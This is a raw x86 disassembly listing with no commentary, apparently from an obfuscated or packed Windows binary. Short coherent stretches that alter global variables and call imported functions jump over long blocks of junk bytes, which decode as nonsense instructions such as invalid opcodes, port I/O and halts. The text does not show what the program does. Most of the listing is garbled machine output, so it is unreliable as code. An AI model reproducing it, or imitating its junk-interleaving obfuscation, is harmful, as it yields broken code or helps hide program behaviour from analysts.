  40ef6d:	imul   edx,DWORD PTR [ebx+edi*4+0x5c],0x45aa3ff5
  40ef75:	jle    0x40ef50
  40ef77:	mov    ch,0xbf
  40ef79:	stc    
  40ef7a:	aam    0x18
  40ef7c:	hlt    
  40ef7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef7e:	adc    DWORD PTR [edi+0x1416f731],ebp
  40ef84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef85:	jmp    0x702f5ac6
  40ef8a:	pushf  
  40ef8b:	into   
  40ef8c:	(bad)  
  40ef8d:	out    dx,al
  40ef8e:	adc    edx,DWORD PTR ds:0x56b74bdb
  40ef94:	dec    edi
  40ef95:	sahf   
  40ef96:	mov    ah,0xca
  40ef98:	neg    BYTE PTR ds:0x22f60822
  40ef9e:	lea    esp,[edi+0x65fed19e]
  40efa4:	popa   
  40efa5:	fisttp WORD PTR [ebx]
  40efa7:	add    ah,bl
  40efa9:	repnz cmp al,0x65
  40efac:	out    0x9c,eax
  40efae:	add    al,0xe3
  40efb0:	mov    esp,0x8d9f24fb
  40efb5:	pop    ss
  40efb6:	fisttp QWORD PTR [eax+eiz*4]
  40efb9:	fstp   TBYTE PTR [ebx+ebx*4-0x7484bdf6]
  40efc0:	sbb    DWORD PTR [edx+ebp*8],ecx
  40efc3:	js     0x40f00e
  40efc5:	mov    ds:0x77bb7f3c,eax
  40efca:	xor    DWORD PTR [esi],edx
  40efcc:	pop    es
  40efcd:	add    ebx,esp
  40efcf:	jmp    0x40f022
  40efd1:	xor    ebp,DWORD PTR [esi]
  40efd3:	loop   0x40efbc
  40efd5:	rcl    DWORD PTR [eax-0x2327ba39],0x19
  40efdc:	add    BYTE PTR [eax],al
  40efde:	add    ecx,DWORD PTR ds:0x42f580
  40efe4:	mov    eax,DWORD PTR [ebp-0x28]
  40efe7:	and    DWORD PTR ds:0x42f5fc,edi
  40efed:	mov    ecx,DWORD PTR [ebp-0x24]
  40eff0:	add    eax,0x3e26
  40eff5:	xor    DWORD PTR ds:0x42f5a4,0x42f638
  40efff:	jmp    0x40f0db
  40f004:	lock sub DWORD PTR [ecx],ebx
  40f007:	xchg   ebp,eax
  40f008:	fnstenv [ebp+0x5f206dfc]
  40f00e:	int    0xa1
  40f010:	int    0xa
  40f012:	mov    dh,0xcd
  40f014:	adc    esp,DWORD PTR [ecx+0xbf0000]
  40f01a:	add    BYTE PTR [eax],al
  40f01c:	ja     0x40f083
  40f01e:	mov    ss,WORD PTR [ebx+0x2035c17b]
  40f024:	push   ebx
  40f025:	outs   dx,BYTE PTR ds:[esi]
  40f026:	cmp    al,0x2d
  40f028:	cwde   
  40f029:	mov    eax,ds:0x3308eb62
  40f02e:	test   eax,0x38fbec28
  40f033:	sub    DWORD PTR [ebx-0xcb9fb24],ebx
  40f039:	out    dx,eax
  40f03a:	ins    DWORD PTR es:[edi],dx
  40f03b:	jmp    0xb6d:0x180d5672
  40f042:	sub    DWORD PTR [esi],ecx
  40f044:	data16 ins BYTE PTR es:[edi],dx
  40f046:	cmp    bh,dh
  40f048:	scas   al,BYTE PTR es:[edi]
  40f049:	dec    ebp
  40f04a:	in     eax,0x40
  40f04c:	push   esi
  40f04d:	stc    
  40f04e:	outs   dx,BYTE PTR ds:[esi]
  40f04f:	test   eax,0x9e81e150
  40f054:	mov    esi,ebp
  40f056:	push   edx
  40f057:	xor    DWORD PTR [edi+0x2aa95233],esi
  40f05d:	fwait
  40f05e:	dec    BYTE PTR [esi+0x6cc383e1]
  40f064:	xor    eax,0xd9c7304b
  40f069:	cld    
  40f06a:	mov    ds:0x855510df,al
  40f06f:	jb     0x40f0df
  40f071:	xchg   ecx,eax
  40f072:	hlt    
  40f073:	lahf   
  40f074:	inc    edi
  40f075:	or     edx,eax
  40f077:	or     BYTE PTR [ecx-0x2439918e],ch
  40f07d:	imul   ebp,ecx,0x29
  40f080:	ins    BYTE PTR es:[edi],dx
  40f081:	call   0xda7c7710
  40f086:	out    dx,eax
  40f087:	neg    DWORD PTR [eax]
  40f089:	or     BYTE PTR [eax-0x34a90542],bh
  40f08f:	xor    al,0xef
  40f091:	add    dl,BYTE PTR [ecx-0x7c]
  40f094:	fisttp WORD PTR [esp+esi*1+0x2b]
  40f098:	aaa    
  40f099:	pop    esp
  40f09a:	clc    
  40f09b:	add    cl,BYTE PTR [edx-0x67]
  40f09e:	daa    
  40f09f:	sub    edx,ebx
  40f0a1:	pop    es
  40f0a2:	mov    eax,0x3274a5e4
  40f0a7:	mul    ecx
  40f0a9:	loope  0x40f07c
  40f0ab:	cmc    
  40f0ac:	pop    esp
  40f0ad:	sub    BYTE PTR [ecx-0x16],ah
  40f0b0:	test   DWORD PTR [ecx+edi*1-0x3ac0b21c],edi
  40f0b7:	lods   al,BYTE PTR ds:[esi]
  40f0b8:	jns    0x40f0e8
  40f0ba:	sar    ah,1
  40f0bc:	mov    bl,BYTE PTR [eax+0x4]
  40f0bf:	fstp   TBYTE PTR [ebp+0x5d6c9]
  40f0c5:	mov    cl,0xb5
  40f0c7:	xchg   edx,eax
  40f0c8:	pop    ebp
  40f0c9:	inc    esp
  40f0ca:	push   0x5e
  40f0cc:	pop    ds
  40f0cd:	xchg   ecx,eax
  40f0ce:	pop    esi
  40f0cf:	mov    ds:0xf429680b,eax
  40f0d4:	adc    eax,0x99753561
  40f0d9:	push   cs
  40f0da:	cs or  eax,0x5dd3
  40f0e0:	xor    DWORD PTR ds:0x42f670,0x42f5ec
  40f0ea:	jmp    0x40f1c6
  40f0ef:	into   
  40f0f0:	jo     0x40f113
  40f0f2:	stos   DWORD PTR es:[edi],eax
  40f0f3:	mov    edi,0x5d75cefb
  40f0f8:	add    DWORD PTR [ecx+0x74],ecx
  40f0fb:	push   0xd29f69d4
  40f100:	mov    eax,ds:0xbf0000
  40f105:	add    BYTE PTR [eax],al
  40f107:	and    al,0x1d
  40f109:	jb     0x40f102
  40f10b:	adc    BYTE PTR [ecx+ebx*4-0x740c944d],bl
  40f112:	jl     0x40f09c
  40f114:	dec    ebp
  40f115:	inc    eax
  40f116:	pop    ebp
  40f117:	mov    ds:0x38a4d783,al
  40f11c:	push   eax
  40f11d:	(bad)  
  40f11e:	rcl    BYTE PTR [edx+eax*2+0x26],cl
  40f122:	jle    0x40f188
  40f124:	outs   dx,BYTE PTR ds:[esi]
  40f125:	and    BYTE PTR [edx-0x7df4e95a],bl
  40f12b:	loope  0x40f1a3
  40f12d:	jne    0x40f1a2
  40f12f:	cmp    BYTE PTR [eax-0x2e],bh
  40f132:	frstor [ecx-0x3115c0ee]
  40f138:	retf   
  40f139:	or     ebx,DWORD PTR [ebp+0x60]
  40f13c:	jmp    0x40f17c
  40f13e:	test   BYTE PTR [ebx+0x9a68342],al
  40f144:	pushf  
  40f145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f146:	xchg   edx,eax
  40f147:	sbb    al,BYTE PTR [esi-0x5ad5a52b]
  40f14d:	popa   
  40f14e:	mov    DWORD PTR [ebx],edi
  40f150:	fistp  WORD PTR [ebp+ebx*1+0x7d037771]
  40f157:	xchg   edx,eax
  40f158:	loopne 0x40f167
  40f15a:	in     eax,dx
  40f15b:	aas    
  40f15c:	or     eax,0xb2eed59d
  40f161:	adc    BYTE PTR [esi],dl
  40f163:	repz push 0x74b41a52
  40f169:	int    0x6a
  40f16b:	bnd jb 0x40f14f
  40f16e:	jmp    0x40f181
  40f170:	sti    
  40f171:	pop    ss
  40f172:	sbb    eax,0xb0d6ffc6
  40f177:	xor    ebx,eax
  40f179:	jns    0x40f103
  40f17b:	repnz pop eax
  40f17d:	outs   dx,DWORD PTR ds:[esi]
  40f17e:	fcomip st,st(3)
  40f180:	sub    dh,BYTE PTR [ecx-0x44]
  40f183:	dec    edi
  40f184:	leave  
  40f185:	test   cl,bl
  40f187:	lea    esi,[ecx]
  40f189:	leave  
  40f18a:	int3   
  40f18b:	fistp  DWORD PTR [edx]
  40f18d:	mov    DWORD PTR [esi+edx*1+0x21],esp
  40f191:	or     eax,DWORD PTR [edi-0x392a2918]
  40f197:	jg     0x40f186
  40f199:	mov    esp,0xd5f1e2ac
  40f19e:	stos   DWORD PTR es:[edi],eax
  40f19f:	into   
  40f1a0:	fcomp  QWORD PTR ds:0xb19dd4ac
  40f1a6:	dec    ecx
  40f1a7:	out    dx,eax
  40f1a8:	mov    ch,0xbe
  40f1aa:	fdivr  QWORD PTR [ecx+0x10db1c63]
  40f1b0:	sub    al,0x9e
  40f1b2:	icebp  
  40f1b3:	aad    0xc1
  40f1b5:	stos   DWORD PTR es:[edi],eax
  40f1b6:	ins    DWORD PTR es:[edi],dx
  40f1b7:	mov    esi,0xf8cfc3b7
  40f1bc:	jo     0x40f1aa
  40f1be:	ret    
  40f1bf:	stc    
  40f1c0:	int3   
  40f1c1:	in     al,0x3c
  40f1c3:	in     eax,0x18
  40f1c5:	sbb    al,0x23
  40f1c7:	ror    DWORD PTR [ebx+0x42f5b40d],0x0
  40f1ce:	xor    ecx,DWORD PTR ds:0x42f570
  40f1d4:	mov    DWORD PTR ds:0x42f5b4,ecx
  40f1da:	mov    ecx,DWORD PTR [ebp+0x8]
  40f1dd:	and    DWORD PTR ds:0x42f594,0x42f5d8
  40f1e7:	lea    eax,[eax+ecx*1-0x4c83]
  40f1ee:	jmp    0x40f2ca
  40f1f3:	cmp    BYTE PTR [eax],dl
  40f1f5:	test   DWORD PTR [esi-0x53],edi
  40f1f8:	(bad)  
  40f1f9:	sti    
  40f1fa:	push   esi
  40f1fb:	cmp    al,0x3a
  40f1fd:	mov    edi,0x451f5bde
  40f202:	les    edx,FWORD PTR [ecx-0x40ffff5e]
  40f208:	add    BYTE PTR [eax],al
  40f20a:	add    dh,ch
  40f20c:	sub    bh,BYTE PTR [ecx+0xe607b5c]
  40f212:	outs   dx,BYTE PTR ds:[esi]
  40f213:	jp     0x40f230
  40f215:	sub    ch,BYTE PTR [esi]
  40f217:	xchg   ebx,eax
  40f218:	idiv   BYTE PTR [eax+0x945080b]
  40f21e:	and    al,BYTE PTR [ebp+0x4e]
  40f221:	stos   BYTE PTR es:[edi],al
  40f222:	fcomi  st,st(5)
  40f224:	mov    edi,0x3f2810a
  40f229:	out    0x90,al
  40f22b:	cmc    
  40f22c:	call   0xef62f8ca
  40f231:	inc    esp
  40f232:	ret    0x5595
  40f235:	mov    ds:0xf908abda,al
  40f23a:	pop    ebp
  40f23b:	cmp    DWORD PTR [eax+0xca6dacf],0xcae967d1
  40f245:	jno    0x40f28c
  40f247:	sbb    edi,DWORD PTR [esp+edx*8+0x3]
  40f24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f24c:	mov    ebx,DWORD PTR [ecx-0x23ff41aa]
  40f252:	call   0x43148f60
  40f257:	mov    esi,0xf305979a
  40f25c:	out    dx,eax
  40f25d:	imul   esi,DWORD PTR [ecx-0x4225362c],0x4045865e
  40f267:	cdq    
  40f268:	out    dx,eax
  40f269:	cmp    DWORD PTR [edi-0x1a],esp
  40f26c:	test   bl,0x31
  40f26f:	pushf  
  40f270:	cld    
  40f271:	jmp    0xa1c9:0xc4abbef5
  40f278:	call   0xb9e9:0x4d7982c2
  40f27f:	jmp    0x40f285
  40f281:	pop    ecx
  40f282:	pop    es
  40f283:	jo     0x40f2ef
  40f285:	inc    ecx
  40f286:	inc    DWORD PTR [eax]
  40f288:	inc    ebp
  40f289:	and    dl,BYTE PTR [esi+ebx*1]
  40f28c:	mov    ecx,0x8869fcb1
  40f291:	mov    bl,BYTE PTR [ebx-0x29]
  40f294:	pop    edi
  40f295:	arpl   WORD PTR [ebp+ecx*1+0x21],sp
  40f299:	rol    BYTE PTR [edx+0x308fd78e],0x7a
  40f2a0:	outs   dx,DWORD PTR ds:[esi]
  40f2a1:	aaa    
  40f2a2:	cmp    al,0x8
  40f2a4:	mov    edx,DWORD PTR [ecx]
  40f2a6:	mov    al,ds:0x5fa711a6
  40f2ab:	inc    esi
  40f2ac:	inc    edi
  40f2ad:	xchg   edi,eax
  40f2ae:	jne    0x40f2be
  40f2b0:	scas   al,BYTE PTR es:[edi]
  40f2b1:	test   al,0x52
  40f2b3:	(bad)  
  40f2b4:	into   
  40f2b5:	loop   0x40f31c
  40f2b7:	call   0x4ef0efab
  40f2bc:	call   0x70e6aabb
  40f2c1:	test   al,0x25
  40f2c3:	dec    edi
  40f2c4:	mov    dl,0xb2
  40f2c6:	and    al,0x99
  40f2c8:	jg     0x40f32b
  40f2ca:	push   eax
  40f2cb:	dec    DWORD PTR ds:0x42f650
  40f2d1:	jmp    0x40f3ad
  40f2d6:	cmp    DWORD PTR [eax-0x5e],eax
  40f2d9:	jns    0x40f2d6
  40f2db:	sti    
  40f2dc:	sti    
  40f2dd:	inc    eax
  40f2de:	out    dx,eax
  40f2df:	dec    edx
  40f2e0:	int    0xde
  40f2e2:	in     al,0x90
  40f2e4:	jmp    DWORD PTR [edi+0x50]
  40f2e7:	mov    ds:0xbf0000,eax
  40f2ec:	add    BYTE PTR [eax],al
  40f2ee:	push   0xffffffcb
  40f2f0:	jo     0x40f332
  40f2f2:	push   edx
  40f2f3:	(bad)  
  40f2f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2f5:	inc    ebx
  40f2f6:	shl    DWORD PTR [ebx],1
  40f2f8:	call   0x16c1:0xe967ebe9
  40f2ff:	pop    ds
  40f300:	lds    eax,FWORD PTR [ebp+0x3eca9a1]
  40f306:	cmp    DWORD PTR [edx+edx*8-0x77],0x2b389cc8
  40f30e:	icebp  
  40f30f:	stos   BYTE PTR es:[edi],al
  40f310:	cmp    al,0xf
  40f312:	and    ch,BYTE PTR [edx+0x1b36a444]
  40f318:	rcl    BYTE PTR [edx+0x79],cl
  40f31b:	cmc    
  40f31c:	dec    ebp
  40f31d:	bound  esi,QWORD PTR [esi-0x62]
  40f320:	data16 xor BYTE PTR [ebx+0x32],dh
  40f324:	pop    esi
  40f325:	xchg   esi,eax
  40f326:	cmp    al,0x6b
  40f328:	or     al,0xd
  40f32a:	dec    edx
  40f32b:	jae    0x40f323
  40f32d:	xor    bh,0xd1
  40f330:	rcl    ebp,0x70
  40f333:	xchg   edx,eax
  40f334:	int    0x39
  40f336:	lock push eax
  40f338:	clc    
  40f339:	and    al,0xc6
  40f33b:	rcl    DWORD PTR ds:0x537f93fe,cl
  40f341:	jl     0x40f2e1
  40f343:	sub    ah,al
  40f345:	mov    ds:0x25d30d99,al
  40f34a:	arpl   WORD PTR [ecx+0x74],di
  40f34d:	xor    BYTE PTR [ecx],0xad
  40f350:	push   0x52bc7b90
  40f355:	cmp    BYTE PTR [edx-0x72],dl
  40f358:	inc    edi
  40f359:	cmp    DWORD PTR [edx+edx*8],ebx
  40f35c:	in     eax,0x1
  40f35e:	mov    esp,0xcb891e4c
  40f363:	adc    al,0xce
  40f365:	fwait
  40f366:	aad    0xd6
  40f368:	xor    edi,DWORD PTR [edx-0x298d4c2c]
  40f36e:	push   ebx
  40f36f:	or     eax,0x541560ab
  40f374:	jno    0x40f33c
  40f376:	outs   dx,DWORD PTR ds:[esi]
  40f377:	dec    edi
  40f378:	jp     0x40f35e
  40f37a:	in     eax,0xb9
  40f37c:	xchg   BYTE PTR [ebx],ah
  40f37e:	sahf   
  40f37f:	push   es
  40f380:	or     bh,ch
  40f382:	mov    bh,BYTE PTR [eax+0x41]
  40f385:	jae    0x40f363
  40f387:	jecxz  0x40f32f
  40f389:	lds    ebp,FWORD PTR [ebx]
  40f38b:	retf   0xc18d
  40f38e:	jmp    0x9106:0xcaf0cbd8
  40f395:	js     0x40f3a3
  40f397:	call   0xc9138a40
  40f39c:	fldln2 
  40f39e:	nop    edi
  40f3a1:	xor    eax,0x2822210e
  40f3a6:	mov    cl,0x68
  40f3a8:	inc    esi
  40f3a9:	imul   ebx,DWORD PTR [ecx+0x21],0xc320e887
  40f3b0:	add    BYTE PTR [eax],al
  40f3b2:	and    DWORD PTR ds:0x42f59c,edx
  40f3b8:	mov    ecx,eax
  40f3ba:	cmp    DWORD PTR ds:0x42f544,0x0
  40f3c1:	ja     0x40f3db
  40f3c7:	xor    DWORD PTR ds:0x42f544,ebx
  40f3cd:	jmp    0x40f3db
  40f3d2:	push   DWORD PTR [ebp-0x28]
  40f3d5:	call   DWORD PTR ds:0x438814
  40f3db:	mov    eax,DWORD PTR [ebp-0x20]
  40f3de:	or     eax,0x7844
  40f3e3:	jmp    0x40f4bf
  40f3e8:	jle    0x40f3a9
  40f3ea:	fstp   QWORD PTR [ecx-0x810423]
  40f3f0:	in     al,dx
  40f3f1:	adc    eax,DWORD PTR [esi-0x6bf90dcd]
  40f3f7:	int3   
  40f3f8:	shld   DWORD PTR [eax],eax,0x0
  40f3fc:	mov    edi,0x15000000
  40f401:	mov    BYTE PTR [eax+0x2e],ah
  40f404:	xchg   esi,eax
  40f405:	mov    dh,0xfe
  40f407:	push   esp
  40f408:	jb     0x40f3a2
  40f40a:	mov    ?,WORD PTR [eax-0x49]
  40f40d:	scas   al,BYTE PTR es:[edi]
  40f40e:	push   edi
  40f40f:	pop    ss
  40f410:	xchg   edx,eax
  40f411:	add    eax,0x656d13a9
  40f416:	mov    edi,0x4d0c58cf
  40f41b:	mov    ebp,0xd7eefc39
  40f420:	or     ebx,eax
  40f422:	add    BYTE PTR [esi],cl
  40f424:	jge    0x40f3b8
  40f426:	fsubr  QWORD PTR [esi+0x50600f3f]
  40f42c:	les    esp,FWORD PTR [esi-0x39]
  40f42f:	nop
  40f430:	adc    DWORD PTR [edx+0x52],edx
  40f433:	cld    
  40f434:	adc    BYTE PTR [edx-0x6c],0x62
  40f438:	inc    esp
  40f439:	jb     0x40f3f8
  40f43b:	or     al,0x1d
  40f43d:	and    eax,DWORD PTR [ebp+0x1a5e529c]
  40f443:	lods   al,BYTE PTR ds:[esi]
  40f444:	pop    ss
  40f445:	xchg   ebp,eax
  40f446:	pushf  
  40f447:	outs   dx,BYTE PTR ds:[esi]
  40f448:	jne    0x40f3d3
  40f44a:	jle    0x40f409
  40f44c:	jmp    0xbc8814b0
  40f451:	(bad)  
  40f452:	push   ecx
  40f453:	ret    
  40f454:	mov    eax,DWORD PTR [ecx+0x1edcbe4d]
  40f45a:	test   eax,0xb461f52f
  40f45f:	and    ebp,0x3
  40f462:	jmp    0xc6f122bc
  40f467:	fsubr  DWORD PTR [ebx]
  40f469:	bound  esi,QWORD PTR [edx+0x33]
  40f46c:	jb     0x40f460
  40f46e:	daa    
  40f46f:	std    
  40f470:	ins    DWORD PTR es:[edi],dx
  40f471:	inc    ecx
  40f472:	fwait
  40f473:	pop    esi
  40f474:	and    al,0x87
  40f476:	ds inc edx
  40f478:	mov    ax,0xda68
  40f47c:	mov    DWORD PTR [ecx-0x5a],ebp
  40f47f:	jmp    0x2dc1acf8
  40f484:	push   ebp
  40f485:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f486:	add    bl,BYTE PTR [esi]
  40f488:	stc    
  40f489:	outs   dx,BYTE PTR ds:[esi]
  40f48a:	pop    edx
  40f48b:	(bad)  
  40f48c:	jmp    0x40f41c
  40f48e:	jb     0x40f4df
  40f490:	adc    BYTE PTR [eax+0x27ef3cf3],dh
  40f496:	xchg   edi,eax
  40f497:	pop    ebp
  40f498:	leave  
  40f499:	sbb    esi,esp
  40f49b:	and    eax,DWORD PTR [ecx+edi*4+0x40]
  40f49f:	inc    esi
  40f4a0:	into   
  40f4a1:	xchg   ebp,eax
  40f4a2:	push   ss
  40f4a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4a4:	aas    
  40f4a5:	mov    dh,0x8a
  40f4a7:	or     bl,ch
  40f4a9:	adc    bl,bh
  40f4ab:	repz sar BYTE PTR [edx+eiz*2+0x5b],cl
  40f4b0:	aad    0xbc
  40f4b2:	push   esp
  40f4b3:	mov    BYTE PTR [edx],ah
  40f4b5:	add    BYTE PTR [ecx+eax*1],ch
  40f4b8:	ins    DWORD PTR es:[edi],dx
  40f4b9:	int3   
  40f4ba:	xchg   esp,eax
  40f4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4bc:	cdq    
  40f4bd:	jge    0x40f505
  40f4bf:	add    eax,0x67e9
  40f4c4:	xor    edx,edx
  40f4c6:	push   0x6
  40f4c8:	pop    esi
  40f4c9:	mov    edi,DWORD PTR ds:0x42f52c
  40f4cf:	adc    DWORD PTR ds:0x42f554,edi
  40f4d5:	div    esi
  40f4d7:	mov    edx,DWORD PTR [ebp-0x1c]
  40f4da:	xor    eax,edx
  40f4dc:	sbb    DWORD PTR ds:0x42f610,0x5be3
  40f4e6:	xor    eax,0xacd
  40f4eb:	jmp    0x40f5c7
  40f4f0:	dec    esi
  40f4f1:	test   al,0x43
  40f4f3:	xchg   edi,eax
  40f4f4:	out    0xff,eax
  40f4f6:	fdivp  st(1),st
  40f4f8:	inc    edi
  40f4f9:	lahf   
  40f4fa:	sbb    al,0xde
  40f4fc:	loope  0x40f4d0
  40f4fe:	sbb    DWORD PTR [edi+0xa4ce],edi
  40f504:	mov    edi,0xd2000000
  40f509:	cli    
  40f50a:	out    0x43,eax
  40f50c:	xchg   edi,eax
  40f50d:	enter  0x2201,0xdb
  40f511:	in     al,dx
  40f512:	add    DWORD PTR [eax+ebp*4-0x4e35225d],esi
  40f519:	push   ebp
  40f51a:	inc    esp
  40f51b:	(bad)  
  40f51d:	js     0x40f4cd
  40f51f:	out    dx,al
  40f520:	(bad)  
  40f521:	popa   
  40f522:	retf   
  40f523:	sub    al,0xa2
  40f525:	push   eax
  40f526:	test   al,0x7
  40f528:	jo     0x40f4c9
  40f52a:	lods   eax,DWORD PTR ds:[esi]
  40f52b:	and    edi,DWORD PTR [ecx]
  40f52d:	fisttp WORD PTR [ebx+0x5a9fe5a]
  40f533:	inc    edi
  40f534:	jnp    0x40f4d5
  40f536:	jg     0x40f52c
  40f538:	test   al,0x80
  40f53a:	out    0x18,al
  40f53c:	imul   esp,DWORD PTR ds:0xeb35,0x54712bdf
  40f545:	jbe    0x40f540
  40f547:	mov    BYTE PTR [eax],bl
  40f549:	and    edx,ecx
  40f54b:	sbb    al,0x5b
  40f54d:	addr16 in al,dx
  40f54f:	push   0x55
  40f551:	in     al,0xe7
  40f553:	inc    esi
  40f554:	addr16 xor eax,0xef6a48f4
  40f55a:	mov    cl,0x42
  40f55c:	jge    0x40f52e
  40f55e:	xor    al,0xe7
  40f560:	mov    cs,WORD PTR [edx]
  40f562:	pop    esp
  40f563:	jmp    0x2f8dddbd
  40f568:	outs   dx,BYTE PTR ds:[esi]
  40f569:	pop    eax
  40f56a:	pop    es
  40f56b:	test   BYTE PTR [ebx-0x4e],cl
  40f56e:	loope  0x40f4f4
  40f570:	xchg   esi,eax
  40f571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f572:	inc    eax
  40f573:	neg    DWORD PTR [edi+0x71]
  40f576:	int3   
  40f577:	inc    edi
  40f578:	aad    0x90
  40f57a:	fbstp  TBYTE PTR [ebx+eiz*4]
  40f57d:	(bad)  
  40f57e:	ds call 0xbbb11d2b
  40f584:	jl     0x40f559
  40f586:	and    al,0xd2
  40f588:	fistp  WORD PTR [ebp-0x9184ba1]
  40f58e:	pop    es
  40f58f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40f591:	lea    esi,[esi+eax*8-0x559e84dc]
  40f598:	mov    ebx,0x3f223b25
  40f59d:	shl    DWORD PTR [esi-0x4b],1
  40f5a0:	leave  
  40f5a1:	jo     0x40f560
  40f5a3:	xor    DWORD PTR [eax+0x43],ebp
  40f5a6:	adc    ebx,DWORD PTR [ebp+0x30]
  40f5a9:	lock add bh,BYTE PTR [bx+di+0x417]
  40f5af:	scas   eax,DWORD PTR es:[edi]
  40f5b0:	mov    eax,ds:0xc7c6bd2c
  40f5b5:	hlt    
  40f5b6:	mov    eax,ds:0xe3814d2f
  40f5bb:	leave  
  40f5bc:	js     0x40f63d
  40f5be:	xchg   ebx,eax
  40f5bf:	jo     0x40f5df
  40f5c1:	xor    DWORD PTR [eax+0x5b],ebp
  40f5c4:	cwde   
  40f5c5:	jl     0x40f56e
  40f5c7:	add    ecx,eax
  40f5c9:	adc    DWORD PTR ds:0x42f5f0,edi
  40f5cf:	mov    DWORD PTR [ebp-0x4],ecx
  40f5d2:	sbb    ecx,DWORD PTR ds:0x42f584
  40f5d8:	mov    DWORD PTR [ebp-0x48],0x7080
  40f5df:	adc    DWORD PTR ds:0x42f5ec,ecx
  40f5e5:	mov    DWORD PTR [ebp-0x44],0x2947
  40f5ec:	jmp    0x40f6c8
  40f5f1:	aad    0x45
  40f5f3:	mov    edi,0xfdffbf07
  40f5f8:	xlat   BYTE PTR ds:[ebx]
  40f5f9:	loopne 0x40f592
  40f5fb:	push   esi
  40f5fc:	lahf   
  40f5fd:	(bad)  
  40f5fe:	pusha  
  40f5ff:	adc    esp,DWORD PTR [ebp-0x73]
  40f602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f603:	add    BYTE PTR [eax],al
  40f605:	mov    edi,0xbf000000
  40f60a:	mov    BYTE PTR [ecx],cl
  40f60c:	fisttp DWORD PTR [edx-0x75446526]
  40f612:	inc    esp
  40f613:	jne    0x40f690
  40f615:	mov    es,WORD PTR [ebx+0x69b6c17c]
  40f61b:	fsub   st,st(7)
  40f61d:	sub    dl,BYTE PTR [edi-0x2d]
  40f620:	cmp    BYTE PTR [ebp+0x5f456db6],dl
  40f626:	xchg   ecx,eax
  40f627:	cmp    DWORD PTR [esi+0x4],esi
  40f62a:	fild   DWORD PTR [ebp+edi*2+0x777ff3f7]
  40f631:	dec    ebp
  40f632:	mov    ebp,0xc4837ba0
  40f637:	lahf   
  40f638:	std    
  40f639:	pop    edi
  40f63a:	xchg   ecx,eax
  40f63b:	cmp    cl,BYTE PTR [eax+esi*2-0x68]
  40f63f:	push   cx
  40f641:	mov    eax,ds:0xa0efa9b2
  40f646:	sub    BYTE PTR [edi+ebp*2+0x6982296b],0x92
  40f64e:	fwait
  40f64f:	jecxz  0x40f5e6
  40f651:	retf   0x3c72
  40f654:	pop    eax
  40f655:	jmp    0xc75b61af
  40f65a:	clc    
  40f65b:	retf   
  40f65c:	pop    edi
  40f65d:	(bad)  
  40f65e:	ja     0x40f64c
  40f660:	in     eax,dx
  40f661:	scas   al,BYTE PTR es:[edi]
  40f662:	aas    
  40f663:	int3   
  40f664:	addr16 dec ecx
  40f666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f667:	push   edi
  40f668:	sub    bh,al
  40f66a:	in     eax,dx
  40f66b:	pop    edx
  40f66c:	dec    ebp
  40f66d:	(bad)
  40f671:	inc    ecx
  40f672:	or     DWORD PTR [ebp+0xe5520f0],0xb9b6862c
  40f67c:	mov    ds:0x3f2f0101,al
  40f681:	mov    esp,DWORD PTR [esi+0x1d]
  40f684:	popa   
  40f685:	push   esp
  40f686:	pop    ebp
  40f687:	mov    ebp,0xd828f135
  40f68c:	jne    0x40f6d6
  40f68e:	es mov edx,ebx
  40f691:	jo     0x40f645
  40f693:	fimul  DWORD PTR [ebp+edx*4+0x2e8fce3b]
  40f69a:	ret    0x2f0b
  40f69d:	jmp    0x1f5dc6c
  40f6a2:	xor    DWORD PTR [eax+0xd2db915],esi
  40f6a8:	mov    BYTE PTR [ebx],dh
  40f6aa:	or     BYTE PTR [esi-0x3e84d7dc],bl
  40f6b0:	fiadd  WORD PTR [edi-0x56]
  40f6b3:	mov    al,0x31
  40f6b5:	shr    DWORD PTR [edi],0x8d
  40f6b8:	add    BYTE PTR [edi+0x27b77740],dh
  40f6be:	adc    bh,BYTE PTR [edx+0x3a11dc55]
  40f6c4:	mov    BYTE PTR [ebx],al
  40f6c6:	sub    BYTE PTR [esi-0x3d3fba39],cl
  40f6cc:	adc    eax,DWORD PTR [eax]
  40f6ce:	add    bh,al
  40f6d0:	inc    ebp
  40f6d1:	(bad)  
  40f6d2:	out    0x70,eax
  40f6d4:	add    BYTE PTR [eax],al
  40f6d6:	cmp    DWORD PTR ds:0x42f624,0x0
  40f6dd:	jb     0x40f7da
  40f6e3:	or     edi,DWORD PTR ds:0x42f608
  40f6e9:	jmp    0x40f7da
  40f6ee:	push   0x42f614
  40f6f3:	push   0x4e37
  40f6f8:	call   DWORD PTR ds:0x4387e4
  40f6fe:	jmp    0x40f7da
  40f703:	mov    edi,0xb50bb51b
  40f708:	scas   eax,DWORD PTR es:[edi]
  40f709:	mov    edi,0x86c4ecbf
  40f70e:	int    0x88
  40f710:	gs sahf 
  40f712:	gs dec esp
  40f714:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f715:	add    BYTE PTR [eax],al
  40f717:	mov    edi,0xdd000000
  40f71c:	popa   
  40f71d:	es hlt 
  40f71f:	(bad)  
  40f721:	cli    
  40f722:	push   0x2b
  40f724:	imul   esp,DWORD PTR [eax],0x8e2a474c
  40f72a:	aaa    
  40f72b:	cmp    eax,0x86ba92f2
  40f730:	shr    DWORD PTR gs:[ecx+0x20f074e0],0xb5
  40f738:	inc    ebp
  40f739:	cmp    eax,0x8b84037e
  40f73e:	inc    edx
  40f73f:	test   DWORD PTR [esi-0x1e81b0c6],esi
  40f745:	ret    0xf3dd
  40f748:	xchg   esp,eax
  40f749:	aaa    
  40f74a:	sar    DWORD PTR [esp+edi*1],cl
  40f74d:	cmp    DWORD PTR [eax-0x3a],eax
  40f750:	retf   
  40f751:	out    dx,eax
  40f752:	sti    
  40f753:	sbb    eax,0xc22f8922
  40f758:	cmc    
  40f759:	ret    
  40f75a:	adc    al,0xb5
  40f75c:	dec    ecx
  40f75d:	dec    eax
